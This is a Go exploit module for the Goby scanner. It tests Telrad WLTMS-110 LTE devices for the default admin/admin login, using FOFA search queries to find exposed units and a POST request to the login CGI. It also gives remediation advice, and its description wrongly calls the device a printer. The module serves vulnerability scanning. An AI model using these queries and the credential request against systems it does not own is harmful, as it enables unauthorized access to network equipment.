package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Telrad-WLTMS-110  Default Password",
    "Description": "<p>The Telrad-WLTMS-110 offers deployment flexibility. The high throughput and transmit power of the CPEs combine with the small tower footprint and high capacity of our flagship BreezeCOMPACT base stations - reducing the density of base stations in a network and enabling faster, more affordable LTE deployments.The command center of this series of printers has admin/admin default password.</p>",
    "Product": "Telrad-WLTMS-110",
    "Homepage": "https://telrad.com/",
    "DisclosureDate": "2022-12-20",
    "Author": "wmqfree@163.com",
    "FofaQuery": "(body=\"WLTMS-110 Telrad\" && body=\"frameRtoLControl.js\") || body=\"var multipleParameters = \\\" WLTMS-110\"",
    "GobyQuery": "(body=\"WLTMS-110 Telrad\" && body=\"frameRtoLControl.js\") || body=\"var multipleParameters = \\\" WLTMS-110\"",
    "Level": "1",
    "Impact": "<p>Telrad-WLTMS-110  have default passwords. Attackers can use the default password admin/admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/sysconf.cgi?page=login.asp&action=login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user_name=admin&user_passwd=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: sid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: userlevel",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/sysconf.cgi?page=login.asp&action=login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user_name=admin&user_passwd=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: sid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: userlevel",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin/admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "Telrad-WLTMS-110 默认口令",
            "Product": "Telrad-WLTMS-110",
            "Description": "<p>Telrad-WLTMS-110 模块提供部署灵活性。 CPE 的高吞吐量和传输功率结合我们旗舰 BreezeCOMPACT 基地的小塔占地面积和高容量站——降低网络中基站的密度，实现更快、更实惠的 LTE部署。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。<br></p><p>2、如非必要，禁止公网访问该管理系统。<br></p>",
            "Impact": "<p>Telrad-WLTMS-110存在默认口令，攻击者可未授权使用默认口令admin/admin登录系统后台，执行其他敏感操作，获取更多敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Telrad-WLTMS-110  Default Password",
            "Product": "Telrad-WLTMS-110",
            "Description": "<p>The Telrad-WLTMS-110 offers deployment flexibility. The high throughput and transmit power of the CPEs combine with the small tower footprint and high capacity of our flagship BreezeCOMPACT base stations - reducing the density of base stations in a network and enabling faster, more affordable LTE deployments.The command center of this series of printers has admin/admin default password.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
            "Impact": "<p>Telrad-WLTMS-110&nbsp; have default passwords. Attackers can use the default password admin/admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

